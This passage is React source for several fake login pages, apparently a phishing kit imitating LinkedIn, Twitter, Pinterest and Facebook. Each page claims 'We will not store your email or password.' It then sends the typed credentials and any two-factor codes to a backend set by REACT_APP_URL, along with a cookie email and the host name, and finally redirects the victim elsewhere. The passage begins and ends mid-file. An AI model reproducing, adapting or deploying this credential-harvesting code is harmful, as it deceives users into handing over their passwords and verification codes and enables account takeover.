e.preventDefault();\r\n    this.setState({ loading: true });\r\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\r\n      fetch(`${env.REACT_APP_URL}/linkedin`, {\r\n        method: \"POST\",\r\n        headers: {\r\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\r\n        },\r\n        body: queryString.stringify({\r\n          username: this.state.username,\r\n          password: this.state.password,\r\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\r\n          appName: this.state.appName,\r\n        }),\r\n      })\r\n        .then((response) => response.json())\r\n        .then((responseData) => {\r\n          console.log(responseData);\r\n          this.setState(\r\n            {\r\n              message: responseData.message,\r\n            },\r\n            () => {\r\n              this.onShowAlert();\r\n            }\r\n          );\r\n          if (!responseData.success) {\r\n            this.setState({ loading: false });\r\n          } else {\r\n            if (responseData.manualCheck) {\r\n              this.setState({\r\n                manualCheck: true,\r\n                challangeID: responseData.challangeID,\r\n                loading: true,\r\n              });\r\n            } else {\r\n              this.setState({ success: true });\r\n            }\r\n          }\r\n        });\r\n    } else {\r\n      if (this.state.username.length === 0) {\r\n        this.setState(\r\n          {\r\n            message: \"username cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      } else {\r\n        this.setState(\r\n          {\r\n            message: \"password cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      }\r\n    }\r\n  };\r\n  handleCodeClick = (e) => {\r\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\r\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\r\n        this.onShowAlert();\r\n      });\r\n    } else {\r\n      fetch(\r\n        `${env.REACT_APP_URL}/linkedinCheck?code=${this.state.code}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&email=${this.state.username}&password=${this.state.password}&challangeID=${this.state.challangeID}&appName=${this.state.appName}`,\r\n        {\r\n          method: \"GET\",\r\n        }\r\n      )\r\n        .then((response) => response.json())\r\n        .then((responseData) => {\r\n          console.log(responseData);\r\n          this.setState(\r\n            {\r\n              message: responseData.message,\r\n            },\r\n            () => {\r\n              this.onShowAlert();\r\n            }\r\n          );\r\n          if (responseData.success) {\r\n            this.setState({ success: true });\r\n          } else {\r\n            this.setState({ message: responseData.message, code: \"\" }, () => {\r\n              this.onShowAlert();\r\n            });\r\n          }\r\n        });\r\n    }\r\n  };\r\n  setRedirect = () => {\r\n    this.setState({\r\n      redirect: true,\r\n    });\r\n  };\r\n  renderRedirect = () => {\r\n    if (this.state.redirect) {\r\n      return <Redirect to=\"/\" />;\r\n    }\r\n  };\r\n  render() {\r\n    return (\r\n      <>\r\n        <Header />\r\n        <Container fluid=\"sm\">\r\n          <Row>\r\n            <Col>\r\n              <Card>\r\n                <Card.Body>\r\n                  <div class=\"row justify-content-center\">\r\n                    <div className=\"col-12 col-md-8 col-xl-8\">\r\n                      {this.renderRedirect()}\r\n                      {this.state.showAlert ? (\r\n                        <Alert variant=\"danger\">{this.state.message}</Alert>\r\n                      ) : (\r\n                        \"\"\r\n                      )}\r\n                      {this.state.success ? (\r\n                        <>\r\n                          {\" \"}\r\n                          <center>\r\n                            <h1 className=\"instaunicorn-h1\">Login Success Thank You!</h1>\r\n                            <p className=\"instaunicorn-p\">Redirecting...</p>\r\n                          </center>\r\n                          <Route\r\n                            component={() => {\r\n                              window.setTimeout(() => {\r\n                                window.location.href =\r\n                                  env.REACT_APP_REDIRECTURL;\r\n                              }, 5000);\r\n\r\n                              return null;\r\n                            }}\r\n                          />\r\n                        </>\r\n                      ) : (\r\n                        <>\r\n                          <h1 className=\"display-4 text-center mb-3 instaunicorn-h1\">\r\n                            We Value Your Security.\r\n                          </h1>\r\n\r\n                          <p className=\"text-muted text-center mb-5 instaunicorn-p\">\r\n                            We will not store your email or password.\r\n                          </p>\r\n\r\n                          <Form>\r\n                            <Form.Group controlId=\"name\">\r\n                              <Form.Label>Email Address</Form.Label>\r\n                              <Form.Control\r\n                                className=\"instaunicorn-input\"\r\n                                type=\"text\"\r\n                                id=\"name\"\r\n                                placeholder=\"name@address.com\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handleUsername(e)}\r\n                                value={this.state.username}\r\n                                name=\"name\"\r\n                              />\r\n                            </Form.Group>\r\n                            <Form.Group controlId=\"pass\">\r\n                              <Form.Label>Password</Form.Label>\r\n                              <Form.Control\r\n                                className=\"instaunicorn-input\"\r\n                                type=\"password\"\r\n                                id=\"pass\"\r\n                                placeholder=\"password\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handlePassword(e)}\r\n                                value={this.state.password}\r\n                                name=\"name\"\r\n                              />\r\n                            </Form.Group>\r\n                            {this.state.loading ? (\r\n                              <Button variant=\"primary\" type=\"submit\" disabled className=\"instaunicorn-btn-black\">\r\n                                <Spinner\r\n                                  as=\"span\"\r\n                                  animation=\"grow\"\r\n                                  size=\"sm\"\r\n                                  role=\"status\"\r\n                                  aria-hidden=\"true\"\r\n                                />\r\n                                Loading...\r\n                              </Button>\r\n                            ) : (\r\n                              <button\r\n                                onClick={(e) => this.handleClick(e)}\r\n                                type=\"button\"\r\n                                className=\"btn btn-lg btn-block btn-primary mb-3 login_btn instaunicorn-btn-black\"\r\n                              >\r\n                                Login Now!\r\n                              </button>\r\n                            )}\r\n\r\n                            {this.state.manualCheck ? (\r\n                              <div>\r\n                                <Form.Group>\r\n                                  <Form.Label>\r\n                                    Enter code received in your email\r\n                                  </Form.Label>\r\n                                  <input\r\n                                    value={this.state.code}\r\n                                    onChange={(e) => {\r\n                                      this.handleCode(e);\r\n                                    }}\r\n                                    placeholder=\"Enter code you receieved\"\r\n                                    type=\"number\"\r\n                                    maxLength=\"11\"\r\n                                    name=\"name\"\r\n                                    autocomplete=\"off\"\r\n                                    className=\"form-control instaunicorn-input\"\r\n                                  ></input>\r\n                                </Form.Group>\r\n                                <button\r\n                                  onClick={() => {\r\n                                    this.handleCodeClick();\r\n                                  }}\r\n                                  type=\"button\"\r\n                                  className=\"btn login_btn instaunicorn-btn-black\"\r\n                                >\r\n                                  submit code\r\n                                </button>\r\n                              </div>\r\n                            ) : (\r\n                              \"\"\r\n                            )}\r\n                          </Form>\r\n                        </>\r\n                      )}\r\n                    </div>\r\n                  </div>\r\n                </Card.Body>\r\n              </Card>\r\n            </Col>\r\n          </Row>\r\n        </Container>\r\n        <Footer withText />\r\n      </>\r\n    );\r\n  }\r\n}\r\n","import React, { Component } from \"react\";\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\nimport { Route, Redirect } from \"react-router-dom\";\r\n\r\nimport {\r\n  Container,\r\n  Row,\r\n  Col,\r\n  Card,\r\n  Form,\r\n  Button,\r\n  Alert,\r\n  Spinner,\r\n} from \"react-bootstrap\";\r\n\r\nimport Header from \"./Header\";\r\nimport Footer from \"./Footer\";\r\n\r\nconst queryString = require(\"query-string\");\r\nconst env = runtimeEnv();\r\n\r\nexport default class Twitter extends Component {\r\n  state = {\r\n    username: \"\",\r\n    password: \"\",\r\n    showAlert: false,\r\n    loading: false,\r\n    message: \"\",\r\n    manualCheck: false,\r\n    success: false,\r\n    redirect: false,\r\n    challenge_id: \"\",\r\n    challenge_type: \"\",\r\n    enc_user_id: \"\",\r\n    code: \"\",\r\n    appName: window.location.hostname.substring(0).split(\".\")[0],\r\n  };\r\n  handleUsername = (event) => {\r\n    this.setState({ username: event.target.value });\r\n  };\r\n  handleCode = (event) => {\r\n    this.setState({ code: event.target.value });\r\n  };\r\n  handlePassword = (event) => {\r\n    this.setState({ password: event.target.value });\r\n  };\r\n  onShowAlert = () => {\r\n    this.setState({ showAlert: true }, () => {\r\n      window.setTimeout(() => {\r\n        this.setState({ showAlert: false });\r\n      }, 30000);\r\n    });\r\n  };\r\n  handleClick = (e) => {\r\n    e.preventDefault();\r\n    this.setState({ loading: true });\r\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\r\n      fetch(`${env.REACT_APP_URL}/login/twitter`, {\r\n        method: \"POST\",\r\n        headers: {\r\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\r\n        },\r\n        body: queryString.stringify({\r\n          username: this.state.username,\r\n          password: this.state.password,\r\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\r\n          appName: this.state.appName,\r\n        }),\r\n      })\r\n        .then((response) => response.json())\r\n        .then((responseData) => {\r\n          console.log(responseData);\r\n          this.setState(\r\n            {\r\n              message: responseData.message,\r\n            },\r\n            () => {\r\n              this.onShowAlert();\r\n            }\r\n          );\r\n          if (!responseData.success) {\r\n            this.setState({ loading: false });\r\n          } else {\r\n            if (responseData.manualCheck) {\r\n              this.setState({\r\n                manualCheck: true,\r\n                challenge_type: responseData.challenge_type,\r\n                challenge_id: responseData.challenge_id,\r\n                enc_user_id: responseData.enc_user_id,\r\n                loading: true,\r\n              });\r\n            } else {\r\n              this.setState({ success: true });\r\n            }\r\n          }\r\n        });\r\n    } else {\r\n      if (this.state.username.length === 0) {\r\n        this.setState(\r\n          {\r\n            message: \"username cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      } else {\r\n        this.setState(\r\n          {\r\n            message: \"password cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      }\r\n    }\r\n  };\r\n  handleCodeClick = (e) => {\r\n    fetch(\r\n      `${env.REACT_APP_URL}/login/twitter/verifyCode?code=${this.state.code}&challenge_type=${this.state.challenge_type}&enc_user_id=${this.state.enc_user_id}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&username=${this.state.username}&password=${this.state.password}&challenge_id=${this.state.challenge_id}&appName=${this.state.appName}`,\r\n      {\r\n        method: \"GET\",\r\n      }\r\n    )\r\n      .then((response) => response.json())\r\n      .then((responseData) => {\r\n        console.log(responseData);\r\n        this.setState(\r\n          {\r\n            message: responseData.message,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n        if (responseData.success) {\r\n          this.setState({ success: true });\r\n        } else {\r\n          this.setState({ message: responseData.message, code: \"\" }, () => {\r\n            this.onShowAlert();\r\n          });\r\n        }\r\n      });\r\n  };\r\n  setRedirect = () => {\r\n    this.setState({\r\n      redirect: true,\r\n    });\r\n  };\r\n  renderRedirect = () => {\r\n    if (this.state.redirect) {\r\n      return <Redirect to=\"/\" />;\r\n    }\r\n  };\r\n  render() {\r\n    return (\r\n      <>\r\n        <Header />\r\n        <Container fluid=\"sm\">\r\n          <Row>\r\n            <Col>\r\n              <Card>\r\n                <Card.Body>\r\n                  <div class=\"row justify-content-center\">\r\n                    <div className=\"col-12 col-md-8 col-xl-8\">\r\n                      {this.renderRedirect()}\r\n                      {this.state.showAlert ? (\r\n                        <Alert variant=\"danger\">{this.state.message}</Alert>\r\n                      ) : (\r\n                        \"\"\r\n                      )}\r\n                      {this.state.success ? (\r\n                        <>\r\n                          {\" \"}\r\n                          <center>\r\n                            <h1 className=\"instaunicorn-h1\">Login Success Thank You!</h1>\r\n                            <p className=\"instaunicorn-p\">Redirecting...</p>\r\n                          </center>\r\n                          <Route\r\n                            component={() => {\r\n                              window.setTimeout(() => {\r\n                                window.location.href =\r\n                                  env.REACT_APP_REDIRECTURL;\r\n                              }, 5000);\r\n\r\n                              return null;\r\n                            }}\r\n                          />\r\n                        </>\r\n                      ) : (\r\n                        <>\r\n                          <h1 className=\"display-4 text-center mb-3 instaunicorn-h1\">\r\n                            We Value Your Security.\r\n                          </h1>\r\n\r\n                          <p className=\"text-muted text-center mb-5 instaunicorn-p\">\r\n                            We will not store your email or password.\r\n                          </p>\r\n\r\n                          <Form>\r\n                            <Form.Group controlId=\"name\">\r\n                              <Form.Label>Email Address</Form.Label>\r\n                              <Form.Control\r\n                                className=\"instaunicorn-input\"\r\n                                type=\"text\"\r\n                                id=\"name\"\r\n                                placeholder=\"name@address.com\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handleUsername(e)}\r\n                                value={this.state.username}\r\n                                name=\"name\"\r\n                              />\r\n                            </Form.Group>\r\n                            <Form.Group controlId=\"pass\">\r\n                              <Form.Label>Password</Form.Label>\r\n                              <Form.Control\r\n                                className=\"instaunicorn-input\"\r\n                                type=\"password\"\r\n                                id=\"pass\"\r\n                                placeholder=\"password\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handlePassword(e)}\r\n                                value={this.state.password}\r\n                                name=\"name\"\r\n                              />\r\n                            </Form.Group>\r\n                            {this.state.loading ? (\r\n                              <Button variant=\"primary\" type=\"submit\" disabled className=\"instaunicorn-btn-black\">\r\n                                <Spinner\r\n                                  as=\"span\"\r\n                                  animation=\"grow\"\r\n                                  size=\"sm\"\r\n                                  role=\"status\"\r\n                                  aria-hidden=\"true\"\r\n                                />\r\n                                Loading...\r\n                              </Button>\r\n                            ) : (\r\n                              <button\r\n                                onClick={(e) => this.handleClick(e)}\r\n                                type=\"button\"\r\n                                className=\"btn btn-lg btn-block btn-primary mb-3 login_btn instaunicorn-btn-black\"\r\n                              >\r\n                                Login Now!\r\n                              </button>\r\n                            )}\r\n\r\n                            {this.state.manualCheck ? (\r\n                              <div>\r\n                                <Form.Group>\r\n                                  <Form.Label>\r\n                                    {this.state.challenge_type === \"RetypeEmail\"\r\n                                      ? \"Enter your email id\"\r\n                                      : \"Enter code recieved in your email\"}\r\n                                  </Form.Label>\r\n                                  <input\r\n                                    value={this.state.code}\r\n                                    onChange={(e) => {\r\n                                      this.handleCode(e);\r\n                                    }}\r\n                                    type=\"text\"\r\n                                    name=\"name\"\r\n                                    autocomplete=\"off\"\r\n                                    placeholder=\"Enter code you receieved\"\r\n                                    className=\"form-control instaunicorn-input\"\r\n                                  ></input>\r\n                                </Form.Group>\r\n                                <button\r\n                                  onClick={() => {\r\n                                    this.handleCodeClick();\r\n                                  }}\r\n                                  type=\"button\"\r\n                                  className=\"btn login_btn instaunicorn-btn-black\"\r\n                                >\r\n                                  submit code\r\n                                </button>\r\n                              </div>\r\n                            ) : (\r\n                              \"\"\r\n                            )}\r\n                          </Form>\r\n                        </>\r\n                      )}\r\n                    </div>\r\n                  </div>\r\n                </Card.Body>\r\n              </Card>\r\n            </Col>\r\n          </Row>\r\n        </Container>\r\n        <Footer withText />\r\n      </>\r\n    );\r\n  }\r\n}\r\n","import React, { Component } from \"react\";\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\nimport { Route, Redirect } from \"react-router-dom\";\r\nimport {\r\n  Container,\r\n  Row,\r\n  Col,\r\n  Card,\r\n  Form,\r\n  Button,\r\n  Alert,\r\n  Spinner,\r\n} from \"react-bootstrap\";\r\n\r\nimport Header from \"./Header\";\r\nimport Footer from \"./Footer\";\r\n\r\nconst queryString = require(\"query-string\");\r\nconst env = runtimeEnv();\r\n\r\nexport default class Pinterest extends Component {\r\n  state = {\r\n    username: \"\",\r\n    password: \"\",\r\n    showAlert: false,\r\n    loading: false,\r\n    message: \"\",\r\n    manualCheck: false,\r\n    success: false,\r\n    redirect: false,\r\n    appName: window.location.hostname.substring(0).split(\".\")[0],\r\n  };\r\n  handleUsername = (event) => {\r\n    this.setState({ username: event.target.value });\r\n  };\r\n  handleCode = (event) => {\r\n    this.setState({ code: event.target.value });\r\n  };\r\n  handlePassword = (event) => {\r\n    this.setState({ password: event.target.value });\r\n  };\r\n  onShowAlert = () => {\r\n    this.setState({ showAlert: true }, () => {\r\n      window.setTimeout(() => {\r\n        this.setState({ showAlert: false });\r\n      }, 30000);\r\n    });\r\n  };\r\n  handleClick = (e) => {\r\n    e.preventDefault();\r\n\r\n    this.setState({ loading: true });\r\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\r\n      fetch(`${env.REACT_APP_URL}/login/pinterest`, {\r\n        method: \"POST\",\r\n        headers: {\r\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\r\n        },\r\n        body: queryString.stringify({\r\n          username: this.state.username,\r\n          password: this.state.password,\r\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\r\n          appName: this.state.appName,\r\n        }),\r\n      })\r\n        .then((response) => response.json())\r\n        .then((responseData) => {\r\n          console.log(responseData);\r\n          this.setState(\r\n            {\r\n              message: responseData.message,\r\n            },\r\n            () => {\r\n              this.onShowAlert();\r\n            }\r\n          );\r\n          if (!responseData.success) {\r\n            this.setState({ loading: false });\r\n          } else {\r\n            if (responseData.manualCheck) {\r\n              this.setState({\r\n                manualCheck: true,\r\n                challenge_type: responseData.challenge_type,\r\n                challenge_id: responseData.challenge_id,\r\n                enc_user_id: responseData.enc_user_id,\r\n                loading: true,\r\n              });\r\n            } else {\r\n              this.setState({ success: true });\r\n            }\r\n          }\r\n        });\r\n    } else {\r\n      if (this.state.username.length === 0) {\r\n        this.setState(\r\n          {\r\n            message: \"email id cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      } else {\r\n        this.setState(\r\n          {\r\n            message: \"password cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      }\r\n    }\r\n  };\r\n  handleCodeClick = (e) => {\r\n    fetch(\r\n      `${env.REACT_APP_URL}/login/twitter/verifyCode?code=${this.state.code}&challenge_type=${this.state.challenge_type}&enc_user_id=${this.state.enc_user_id}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&username=${this.state.username}&password=${this.state.password}&challenge_id=${this.state.challenge_id}&appName=${this.state.appName}`,\r\n      {\r\n        method: \"GET\",\r\n      }\r\n    )\r\n      .then((response) => response.json())\r\n      .then((responseData) => {\r\n        console.log(responseData);\r\n        this.setState(\r\n          {\r\n            message: responseData.message,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n        if (responseData.success) {\r\n          this.setState({ success: true });\r\n        } else {\r\n          this.setState({ message: responseData.message, code: \"\" }, () => {\r\n            this.onShowAlert();\r\n          });\r\n        }\r\n      });\r\n  };\r\n  setRedirect = () => {\r\n    this.setState({\r\n      redirect: true,\r\n    });\r\n  };\r\n  renderRedirect = () => {\r\n    if (this.state.redirect) {\r\n      return <Redirect to=\"/\" />;\r\n    }\r\n  };\r\n  render() {\r\n    return (\r\n      <>\r\n        <Header />\r\n        <Container fluid=\"sm\">\r\n          <Row>\r\n            <Col>\r\n              <Card>\r\n                <Card.Body>\r\n                  <div class=\"row justify-content-center\">\r\n                    <div className=\"col-12 col-md-8 col-xl-8\">\r\n                      {this.renderRedirect()}\r\n                      {this.state.showAlert ? (\r\n                        <Alert variant=\"danger\">{this.state.message}</Alert>\r\n                      ) : (\r\n                        \"\"\r\n                      )}\r\n                      {this.state.success ? (\r\n                        <>\r\n                          {\" \"}\r\n                          <center>\r\n                            <h1 className=\"instaunicorn-h1\">Login Success Thank You!</h1>\r\n                            <p className=\"instaunicorn-p\">Redirecting...</p>\r\n                          </center>\r\n                          <Route\r\n                            component={() => {\r\n                              window.setTimeout(() => {\r\n                                window.location.href =\r\n                                  env.REACT_APP_REDIRECTURL;\r\n                              }, 5000);\r\n\r\n                              return null;\r\n                            }}\r\n                          />\r\n                        </>\r\n                      ) : (\r\n                        <>\r\n                          <h1 className=\"display-4 text-center mb-3 instaunicorn-h1\">\r\n                            We Value Your Security.\r\n                          </h1>\r\n\r\n                          <p className=\"text-muted text-center mb-5 instaunicorn-p\">\r\n                            We will not store your email or password.\r\n                          </p>\r\n\r\n                          <Form>\r\n                            <Form.Group controlId=\"name\">\r\n                              <Form.Label>Email Address</Form.Label>\r\n                              <Form.Control\r\n                                className=\"instaunicorn-input\"\r\n                                type=\"text\"\r\n                                id=\"name\"\r\n                                placeholder=\"name@address.com\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handleUsername(e)}\r\n                                value={this.state.username}\r\n                                name=\"name\"\r\n                              />\r\n                            </Form.Group>\r\n                            <Form.Group controlId=\"pass\">\r\n                              <Form.Label>Password</Form.Label>\r\n                              <Form.Control\r\n                                className=\"instaunicorn-input\"\r\n                                type=\"password\"\r\n                                id=\"pass\"\r\n                                placeholder=\"password\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handlePassword(e)}\r\n                                value={this.state.password}\r\n                                name=\"name\"\r\n                              />\r\n                            </Form.Group>\r\n                            {this.state.loading ? (\r\n                              <Button variant=\"primary\" type=\"submit\" disabled className=\"instaunicorn-btn-black\">\r\n                                <Spinner\r\n                                  as=\"span\"\r\n                                  animation=\"grow\"\r\n                                  size=\"sm\"\r\n                                  role=\"status\"\r\n                                  aria-hidden=\"true\"\r\n                                />\r\n                                Loading...\r\n                              </Button>\r\n                            ) : (\r\n                              <button\r\n                                onClick={(e) => this.handleClick(e)}\r\n                                type=\"button\"\r\n                                className=\"btn btn-lg btn-block btn-primary mb-3 login_btn instaunicorn-btn-black\"\r\n                              >\r\n                                Login Now!\r\n                              </button>\r\n                            )}\r\n\r\n                            {this.state.manualCheck ? (\r\n                              <div>\r\n                                <Form.Group >\r\n                                  <Form.Label>\r\n                                    {this.state.challenge_type === \"RetypeEmail\"\r\n                                      ? \"Enter your email id\"\r\n                                      : \"Enter code recieved in your email\"}\r\n                                  </Form.Label>\r\n                                  <input\r\n                                    value={this.state.code}\r\n                                    onChange={(e) => {\r\n                                      this.handleCode(e);\r\n                                    }}\r\n                                    placeholder=\"Enter code you receieved\"\r\n                                    type=\"number\"\r\n                                    maxLength=\"11\"\r\n                                    name=\"name\"\r\n                                    autocomplete=\"off\"\r\n                                    className=\"form-control instaunicorn-input\"\r\n                                  ></input>\r\n                                </Form.Group>\r\n                                <button\r\n                                  onClick={() => {\r\n                                    this.handleCodeClick();\r\n                                  }}\r\n                                  type=\"button\"\r\n                                  className=\"btn login_btn instaunicorn-btn-black\"\r\n                                >\r\n                                  submit code\r\n                                </button>\r\n                              </div>\r\n                            ) : (\r\n                              \"\"\r\n                            )}\r\n                          </Form>\r\n                        </>\r\n                      )}\r\n                    </div>\r\n                  </div>\r\n                </Card.Body>\r\n              </Card>\r\n            </Col>\r\n          </Row>\r\n        </Container>\r\n        <Footer withText />\r\n      </>\r\n    );\r\n  }\r\n}\r\n","import React, { Component } from \"react\";\r\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\r\nimport { Route, Redirect } from \"react-router-dom\";\r\nimport {\r\n  Container,\r\n  Row,\r\n  Col,\r\n  Card,\r\n  Form,\r\n  Button,\r\n  Alert,\r\n  Spinner,\r\n} from \"react-bootstrap\";\r\n\r\nimport Header from \"./Header\";\r\nimport Footer from \"./Footer\";\r\nconst queryString = require(\"query-string\");\r\nconst env = runtimeEnv();\r\n\r\nexport default class Facebook extends Component {\r\n  state = {\r\n    username: \"\",\r\n    password: \"\",\r\n    showAlert: false,\r\n    loading: false,\r\n    message: \"\",\r\n    manualCheck: false,\r\n    success: false,\r\n    redirect: false,\r\n    challangeID: \"\",\r\n    code: \"\",\r\n    appName: window.location.hostname.substring(0).split(\".\")[0],\r\n  };\r\n  handleUsername = (event) => {\r\n    this.setState({ username: event.target.value });\r\n  };\r\n  handleCode = (event) => {\r\n    const { value, maxLength } = event.target;\r\n    const message = value.slice(0, maxLength);\r\n    this.setState({ code: message });\r\n  };\r\n  handlePassword = (event) => {\r\n    this.setState({ password: event.target.value });\r\n  };\r\n  onShowAlert = () => {\r\n    this.setState({ showAlert: true }, () => {\r\n      window.setTimeout(() => {\r\n        this.setState({ showAlert: false });\r\n      }, 30000);\r\n    });\r\n  };\r\n  handleClick = (e) => {\r\n    e.preventDefault();\r\n    this.setState({ loading: true });\r\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\r\n      fetch(`${env.REACT_APP_URL}/login/facebook`, {\r\n        method: \"POST\",\r\n        headers: {\r\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\r\n        },\r\n        body: queryString.stringify({\r\n          username: this.state.username,\r\n          password: this.state.password,\r\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\r\n          appName: this.state.appName,\r\n        }),\r\n      })\r\n        .then((response) => response.json())\r\n        .then((responseData) => {\r\n          console.log(responseData);\r\n          this.setState(\r\n            {\r\n              message: responseData.message,\r\n            },\r\n            () => {\r\n              this.onShowAlert();\r\n            }\r\n          );\r\n          if (!responseData.success) {\r\n            this.setState({ loading: false });\r\n          } else {\r\n            if (responseData.manualCheck) {\r\n              this.setState({\r\n                manualCheck: true,\r\n                challangeID: responseData.challangeID,\r\n                loading: true,\r\n              });\r\n            } else {\r\n              this.setState({ success: true });\r\n            }\r\n          }\r\n        });\r\n    } else {\r\n      if (this.state.username.length === 0) {\r\n        this.setState(\r\n          {\r\n            message: \"username cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      } else {\r\n        this.setState(\r\n          {\r\n            message: \"password cannot be empty\",\r\n            loading: false,\r\n          },\r\n          () => {\r\n            this.onShowAlert();\r\n          }\r\n        );\r\n      }\r\n    }\r\n  };\r\n  handleCodeClick = (e) => {\r\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\r\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\r\n        this.onShowAlert();\r\n      });\r\n    } else {\r\n      fetch(\r\n        `${env.REACT_APP_URL}/linkedinCheck?code=${this.state.code}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&email=${this.state.username}&password=${this.state.password}&challangeID=${this.state.challangeID}$appName=${this.state.appName}`,\r\n        {\r\n          method: \"GET\",\r\n        }\r\n      )\r\n        .then((response) => response.json())\r\n        .then((responseData) => {\r\n          console.log(responseData);\r\n          this.setState(\r\n            {\r\n              message: responseData.message,\r\n            },\r\n            () => {\r\n              this.onShowAlert();\r\n            }\r\n          );\r\n          if (responseData.success) {\r\n            this.setState({ success: true });\r\n          } else {\r\n            this.setState({ message: responseData.message, code: \"\" }, () => {\r\n              this.onShowAlert();\r\n            });\r\n          }\r\n        });\r\n    }\r\n  };\r\n  setRedirect = () => {\r\n    this.setState({\r\n      redirect: true,\r\n    });\r\n  };\r\n  renderRedirect = () => {\r\n    if (this.state.redirect) {\r\n      return <Redirect to=\"/\" />;\r\n    }\r\n  };\r\n  render() {\r\n    return (\r\n      <>\r\n        <Header />\r\n        <Container fluid=\"sm\">\r\n          <Row>\r\n            <Col>\r\n              <Card>\r\n                <Card.Body>\r\n                  <div class=\"row justify-content-center\">\r\n                    <div className=\"col-12 col-md-8 col-xl-8\">\r\n                      {this.renderRedirect()}\r\n\r\n                      {this.state.success ? (\r\n                        <>\r\n                          {\" \"}\r\n                          <center>\r\n                            <h1 className=\"instaunicorn-h1\">Login Success Thank You!</h1>\r\n                            <p className=\"instaunicorn-p\">Redirecting...</p>\r\n                          </center>\r\n                          <Route\r\n                            component={() => {\r\n                              window.setTimeout(() => {\r\n                                window.location.href =\r\n                                  env.REACT_APP_REDIRECTURL;\r\n                              }, 5000);\r\n\r\n                              return null;\r\n                            }}\r\n                          />\r\n                        </>\r\n                      ) : (\r\n                        <>\r\n                          <h1 className=\"display-4 text-center mb-3 instaunicorn-h1\">\r\n                            We Value Your Security.\r\n                          </h1>\r\n\r\n                          <p className=\"text-muted text-center mb-5 instaunicorn-p\">\r\n                            We will not store your email or password.\r\n                          </p>\r\n\r\n                          {this.state.showAlert ? (\r\n                            <Alert variant=\"danger\">{this.state.message}</Alert>\r\n                          ) : (\r\n                            \"\"\r\n                          )}\r\n\r\n                          <Form>\r\n                            <Form.Group controlId=\"name\">\r\n                              <Form.Label>Email Address</Form.Label>\r\n                              <Form.Control\r\n                                className=\"instaunicorn-input\"\r\n                                type=\"text\"\r\n                                id=\"name\"\r\n                                placeholder=\"name@address.com\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handleUsername(e)}\r\n                                value={this.state.username}\r\n                                name=\"name\"\r\n                              />\r\n                            </Form.Group>\r\n                            <Form.Group controlId=\"pass\">\r\n                              <Form.Label>Password</Form.Label>\r\n                              <Form.Control\r\n                                className=\"instaunicorn-input\"\r\n                                type=\"password\"\r\n                                id=\"pass\"\r\n                                placeholder=\"password\"\r\n                                autocomplete=\"off\"\r\n                                onChange={(e) => this.handlePassword(e)}\r\n                                value={this.state.password}\r\n                                name=\"name\"\r\n                              />\r\n                            </Form.Group>\r\n                            {this.state.loading ? (\r\n                              <Button variant=\"primary\" type=\"submit\" disabled className=\"instaunicorn-btn-black\">\r\n                                <Spinner\r\n                                  as=\"span\"\r\n                                  animation=\"grow\"\r\n                                  size=\"sm\"\r\n                                  role=\"status\"\r\n                                  aria-hidden=\"true\"\r\n                                />\r\n                                Loading...\r\n                              </Button>\r\n                            ) : (\r\n                              <button\r\n                                onClick={(e) => this.handleClick(e)}\r\n                                type=\"button\"\r\n                                className=\"btn btn-lg btn-block btn-primary mb-3 login_btn instaunicorn-btn-black\"\r\n                              >\r\n                                Login Now!\r\n                              </button>\r\n                            )}\r\n\r\n                            {this.state.manualCheck ? (\r\n                              <div>\r\n                                <Form.Group>\r\n                                  <Form.Label>\r\n                                    Enter code recieved in your email\r\n                                  </Form.Label>\r\n                                  <input\r\n                                    value={this.state.code}\r\n                                    onChange={(e) => {\r\n                                      this.handleCode(e);\r\n                                    }}\r\n                                    placeholder=\"Enter code you receieved\"\r\n                                    type=\"number\"\r\n                                    maxLength=\"11\"\r\n                                    name=\"name\"\r\n                                    className=\"form-control instaunicorn-input\"\r\n                                  ></input>\r\n                                </Form.Group>\r\n                                <button\r\n                                  onClick={() => {\r\n                                    this.handleCodeClick();\r\n                                  